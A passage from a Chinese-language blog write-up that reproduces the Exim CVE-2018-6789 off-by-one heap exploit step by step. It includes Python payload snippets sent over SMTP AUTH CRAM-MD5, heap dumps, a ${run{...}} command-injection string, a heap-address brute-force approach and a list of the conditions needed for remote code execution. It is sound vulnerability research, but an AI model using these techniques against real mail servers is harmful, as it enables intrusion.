fd_nextsize = 0x0,</div><div class="line">  bk_nextsize = 0x0</div><div class="line">&#125;</div><div class="line">0x1d1f200 &#123;</div><div class="line">  prev_size = 0x6060,</div><div class="line">  size = 0x2020,</div><div class="line">  fd = 0x1d27380,</div><div class="line">  bk = 0x2008,</div><div class="line">  fd_nextsize = 0x6363636363636328,</div><div class="line">  bk_nextsize = 0x6363636363636363</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="STEP-3"><a href="#STEP-3" class="headerlink" title="STEP 3"></a>STEP 3</h2><p>现在我们的堆布局是：</p>
<ul>
<li>第一块未被使用的0x2020大小的chunk</li>
<li>第二块正在被使用0x2000大小的<code>sender_host_name</code></li>
<li>第三块未被使用，并且和之后堆块合并, 0x6060大小的chunk</li>
</ul>
<p>我们现在再回过头来想想各个chunk的size的设置的问题</p>
<h3 id="CHUNK-1"><a href="#CHUNK-1" class="headerlink" title="CHUNK 1"></a>CHUNK 1</h3><p>第一个chunk是用来触发<code>off by one</code>漏洞，用来修改第二个CHUNK的size位，只能溢出1byte</p>
<p><code>store_get</code>最小分配一个0x2020的chunk，能储存0x2000的数据</p>
<p>这就导致了，如果按照<code>store_get</code>的最小情况来，只能溢出覆盖掉第二个chunk的pre_size位</p>
<p>然后因为<code>(0x2008-1)%3==0</code>，所以我们能通过b64decode函数的漏洞申请一个能储存0x2008的数据，size=0x2020的chunk，然后溢出一个字节到下一个chunk的size位</p>
<h3 id="CHUNK2"><a href="#CHUNK2" class="headerlink" title="CHUNK2"></a>CHUNK2</h3><p>第二块chunk，我们首先需要考虑，因为只能修改一个字节，所以最大只能从0x00扩展到0xf0</p>
<p>其次，我们假设第二块chunk的原始size=0x2021，然后被修改成0x20f1，我们还需要考虑第二块chunk+0x20f1位置的堆块我们是否可控，因为需要伪造一个fake chunk，来bypass free函数的安全检查。</p>
<p>经过多次调试，发现当第二块chunk的size=0x2001时，更方便后续的利用</p>
<h3 id="CHUNK3"><a href="#CHUNK3" class="headerlink" title="CHUNK3"></a>CHUNK3</h3><p>第三个chunk只要求大于一个<code>store_get</code>申请的最小size(0x2020)就行了</p>
<h2 id="STEP-4"><a href="#STEP-4" class="headerlink" title="STEP 4"></a>STEP 4</h2><p>根据第三步叙述的，我们来触发<code>off by one</code>漏洞</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">payload1 = <span class="string">"HfHf"</span>*<span class="number">0xaae</span></div><div class="line">p.sendline(<span class="string">"AUTH CRAM-MD5"</span>)</div><div class="line">p.sendline(payload1[:<span class="number">-1</span>])</div><div class="line"><span class="comment"># heap</span></div><div class="line"><span class="number">0x1d15180</span> PREV_INUSE &#123;</div><div class="line">  prev_size = <span class="number">0x0</span>,</div><div class="line">  size = <span class="number">0x2021</span>,</div><div class="line">  fd = <span class="number">0x1d191b0</span>,</div><div class="line">  bk = <span class="number">0x2008</span>,</div><div class="line">  fd_nextsize = <span class="number">0xf11ddff11ddff11d</span>,</div><div class="line">  bk_nextsize = <span class="number">0x1ddff11ddff11ddf</span></div><div class="line">&#125;</div><div class="line"><span class="number">0x1d171a0</span> PREV_INUSE &#123;</div><div class="line">  prev_size = <span class="number">0x1ddff11ddff11ddf</span>,</div><div class="line">  size = <span class="number">0x20f1</span>,</div><div class="line">  fd = <span class="number">0x6363636363636363</span>,</div><div class="line">  bk = <span class="number">0x6363636363636363</span>,</div><div class="line">  fd_nextsize = <span class="number">0x6363636363636363</span>,</div><div class="line">  bk_nextsize = <span class="number">0x6363636363636363</span></div><div class="line">&#125;</div><div class="line"><span class="number">0x1d19290</span> PREV_INUSE IS_MMAPED &#123;</div><div class="line">  prev_size = <span class="number">0x6363636363636363</span>,</div><div class="line">  size = <span class="number">0x6363636363636363</span>,</div><div class="line">  fd = <span class="number">0x6363636363636363</span>,</div><div class="line">  bk = <span class="number">0x6363636363636363</span>,</div><div class="line">  fd_nextsize = <span class="number">0x6363636363636363</span>,</div><div class="line">  bk_nextsize = <span class="number">0x6363636363636363</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>并且构造在第三块chunk中构造一个fake chunk</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">payload = p64(<span class="number">0x20f0</span>)+p64(<span class="number">0x1f31</span>)</div><div class="line">p.sendline(<span class="string">"AUTH CRAM-MD5"</span>)</div><div class="line">p.sendline((payload*<span class="number">484</span>).encode(<span class="string">"base64"</span>).replace(<span class="string">"\n"</span>,<span class="string">""</span>))</div><div class="line"><span class="comment"># heap</span></div><div class="line"><span class="number">0x1d15180</span> PREV_INUSE &#123;</div><div class="line">  prev_size = <span class="number">0x0</span>,</div><div class="line">  size = <span class="number">0x2021</span>,</div><div class="line">  fd = <span class="number">0x1d191b0</span>,</div><div class="line">  bk = <span class="number">0x2008</span>,</div><div class="line">  fd_nextsize = <span class="number">0xf11ddff11ddff11d</span>,</div><div class="line">  bk_nextsize = <span class="number">0x1ddff11ddff11ddf</span></div><div class="line">&#125;</div><div class="line"><span class="number">0x1d171a0</span> PREV_INUSE &#123;</div><div class="line">  prev_size = <span class="number">0x1ddff11ddff11ddf</span>,</div><div class="line">  size = <span class="number">0x20f1</span>,</div><div class="line">  fd = <span class="number">0x6363636363636363</span>,</div><div class="line">  bk = <span class="number">0x6363636363636363</span>,</div><div class="line">  fd_nextsize = <span class="number">0x6363636363636363</span>,</div><div class="line">  bk_nextsize = <span class="number">0x6363636363636363</span></div><div class="line">&#125;</div><div class="line"><span class="number">0x1d19290</span> PREV_INUSE &#123;</div><div class="line">  prev_size = <span class="number">0xf0</span>,</div><div class="line">  size = <span class="number">0x1f31</span>,</div><div class="line">  fd = <span class="number">0x20f0</span>,</div><div class="line">  bk = <span class="number">0x1f31</span>,</div><div class="line">  fd_nextsize = <span class="number">0x20f0</span>,</div><div class="line">  bk_nextsize = <span class="number">0x1f31</span></div><div class="line">&#125;</div><div class="line"><span class="number">0x1d1b1c0</span> PREV_INUSE &#123;</div><div class="line">  prev_size = <span class="number">0x2020</span>,</div><div class="line">  size = <span class="number">0x4041</span>,</div><div class="line">  fd = <span class="number">0x7f9520918288</span>,</div><div class="line">  bk = <span class="number">0x7f9520918288</span>,</div><div class="line">  fd_nextsize = <span class="number">0x1d1b1c0</span>,</div><div class="line">  bk_nextsize = <span class="number">0x1d1b1c0</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="STEP-5"><a href="#STEP-5" class="headerlink" title="STEP 5"></a>STEP 5</h2><p>下一步跟meh一样，通过释放<code>sender_host_name</code>，把一个原本0x2000的chunk扩展成0x20f0, 但是却不触发<code>smtp_reset</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">p.sendline(<span class="string">"EHLO a+"</span>)</div><div class="line"><span class="comment"># heap</span></div><div class="line"><span class="number">0x1d171a0</span> PREV_INUSE &#123;</div><div class="line">  prev_size = <span class="number">0x1ddff11ddff11ddf</span>,</div><div class="line">  size = <span class="number">0x20f1</span>,</div><div class="line">  fd = <span class="number">0x1d21240</span>,</div><div class="line">  bk = <span class="number">0x7f9520917b78</span>,</div><div class="line">  fd_nextsize = <span class="number">0x0</span>,</div><div class="line">  bk_nextsize = <span class="number">0x0</span></div><div class="line">&#125;</div><div class="line"><span class="number">0x1d19290</span> &#123;</div><div class="line">  prev_size = <span class="number">0x20f0</span>,</div><div class="line">  size = <span class="number">0x1f30</span>,</div><div class="line">  fd = <span class="number">0x20f0</span>,</div><div class="line">  bk = <span class="number">0x1f31</span>,</div><div class="line">  fd_nextsize = <span class="number">0x20f0</span>,</div><div class="line">  bk_nextsize = <span class="number">0x1f31</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="STEP-6"><a href="#STEP-6" class="headerlink" title="STEP 6"></a>STEP 6</h2><p>meh提供了一种不需要泄露地址就能RCE的思路</p>
<p>exim有一个<code>expand_string</code>函数，当其处理的参数中有<code>${run{xxxxx}}</code>, <code>xxxx</code>则会被当成shell命令执行</p>
<p>而<code>acl_check</code>函数中会对各个命令的配置进行检查，然后把配置信息的字符串调用<code>expand_string</code>函数</p>
<p>我复现环境的配置信息如下:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">pwndbg&gt; x/<span class="number">18</span>gx &amp;acl_smtp_vrfy</div><div class="line"><span class="number">0x6ed848</span> &lt;acl_smtp_vrfy&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x6ed858</span> &lt;acl_smtp_rcpt&gt;:	<span class="number">0x0000000001cedac0</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x6ed868</span> &lt;acl_smtp_predata&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x6ed878</span> &lt;acl_smtp_mailauth&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x6ed888</span> &lt;acl_smtp_helo&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x6ed898</span> &lt;acl_smtp_etrn&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x6ed8a8</span> &lt;acl_smtp_data&gt;:	<span class="number">0x0000000001cedad0</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x6ed8b8</span> &lt;acl_smtp_auth&gt;:	<span class="number">0x0000000001cedae0</span>	<span class="number">0x0000000000000000</span></div></pre></td></tr></table></figure>
<p>所以我有<code>rcpt</code>, <code>data</code>, <code>auth</code>这三个命令可以利用</p>
<p>比如<code>0x0000000001cedae0</code>地址当前的内容是:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">pwndbg&gt; x/s <span class="number">0x0000000001cedae0</span></div><div class="line"><span class="number">0x1cedae0</span>:	<span class="string">"acl_check_auth"</span></div></pre></td></tr></table></figure>
<p>当我把该字符串修改为<code>${run{/usr/bin/touch /tmp/pwned}}</code></p>
<p>则当我向服务器发送<code>AUTH</code>命令时，exim将会执行<code>/usr/bin/touch /tmp/pwned</code></p>
<p>所以之后就是meh所说的利用链:</p>
<p>修改<code>storeblock</code>的next指针为储存<code>acl_check_xxxx</code>字符串的堆块地址 -&gt; 调用smtp_reset -&gt; 储存<code>acl_check_xxxx</code>字符串的堆块被释放丢入unsortedbin -&gt; 申请堆块，当堆块的地址为储存<code>acl_check_xxxx</code>字符串的堆块时，我们可以覆盖该字符串为命令执行的字符串 -&gt; RCE</p>
<h2 id="STEP-7"><a href="#STEP-7" class="headerlink" title="STEP 7"></a>STEP 7</h2><p>根据上一步所说，我们首先需要修改next指针，第二块chunk的原始大小是0x2000，被修改后新的大小是0x20f0，下一个<code>storeblock</code>的地址为第二块chunk+0x2000，next指针地址为第二块chunk+0x2010</p>
<p>所以我们申请一个0x2020的chunk，就能够覆盖next指针：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">p.sendline(<span class="string">"AUTH CRAM-MD5"</span>)</div><div class="line">p.sendline(base64.b64encode(payload*<span class="number">501</span>+p64(<span class="number">0x2021</span>)+p64(<span class="number">0x2021</span>)+p32(address)))</div></pre></td></tr></table></figure>
<p>这里有一个问题</p>
<p>第二个chunk在<code>AUTH CRAM-MD5</code>命令执行时就被分配了，所以<code>b64decode</code>的内存是从<code>next_yield</code>获取的</p>
<p>这样就导致一个问题，我们能通过之前的构造来控制在执行<code>b64decode</code>时<code>yield_length</code>的大小，最开始我的一个思路就是，仍然利用<code>off by one</code>漏洞来修改next，这也是我理解的meh所说的<code>partial write</code></p>
<p>但是实际情况让我这个思路失败了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">pwndbg&gt; x/<span class="number">16</span>gx <span class="number">0x1d171a0</span>+<span class="number">0x2000</span></div><div class="line"><span class="number">0x1d191a0</span>:	<span class="number">0x0063636363636363</span>	<span class="number">0x0000000000002021</span></div><div class="line"><span class="number">0x1d191b0</span>:	<span class="number">0x0000000001d171b0</span>	<span class="number">0x0000000000002000</span></div></pre></td></tr></table></figure>
<p>当前的next指针的值为0x1d171b0，如果利用我的思路是可以修改1-2字节，然而储存<code>acl_check_xxx</code>字符的堆块地址为0x1ced980</p>
<p>我们需要修改3字节，所以这个思路行不通</p>
<p>所以又有了另一个思路，因为exim是通过fork起子进程来处理每个socket连接的，所以我们可以爆破堆的基地址，只需要爆破2byte</p>
<h2 id="STEP-8"><a href="#STEP-8" class="headerlink" title="STEP 8"></a>STEP 8</h2><p>在解决地址的问题后，就是对堆进行填充，然后修改相关<code>acl_check_xxx</code>指向的字符串</p>
<p>然后附上利用截图：</p>
<p><img src="//hcamael.oss-cn-beijing.aliyuncs.com/img/exim_rce.png?x-oss-process=style/blog_sy" alt="exim_rce"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>坑踩的挺多，尤其是在纠结meh所说的<code>partial write</code>，之后在github上看到别人公布的exp<a href="#jump3">[3]</a>，同样也是使用爆破的方法，所以可能我对<code>partial write</code>的理解有问题吧</p>
<p>另外，通过与github上的exp进行对比，发现不同版本的exim，<code>acl_check_xxx</code>的堆偏移也有差别，所以如果需要RCE exim，需要满足下面的条件：</p>
<ol>
<li>包含漏洞的版本(小于等于commit 38e3d2dff7982736f1e6833e06d4aab4652f337a的版本)</li>
<li>开启CRAM-MD5认证，或者其他有调用b64decode函数的认证</li>
<li>需要有该exim的binary来计算堆偏移</li>
<li>需要知道exim的启动参数</li>
</ol>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li><span id="jump1"><a href="https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789-en/" target="_blank" rel="external">https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789-en/</a></span></li>
<li><span id="jump2"><a href="https://github.com/Exim/exim/commit/cf3cd306062a08969c41a1cdd32c6855f1abecf1" target="_blank" rel="external">https://github.com/Exim/exim/commit/cf3cd306062a08969c41a1cdd32c6855f1abecf1</a></span></li>
<li><span id="jump3"><a href="https://github.com/skysider/VulnPOC/tree/master/CVE-2018-6789" target="_blank" rel="external">https://github.com/skysider/VulnPOC/tree/master/CVE-2018-6789</a></span></li>
</ol>
]]></content:encoded>
      
      <comments>//0x48.pw/2018/03/30/0x42/#disqus_thread</comments>
    </item>
    
  </channel>
</rss>
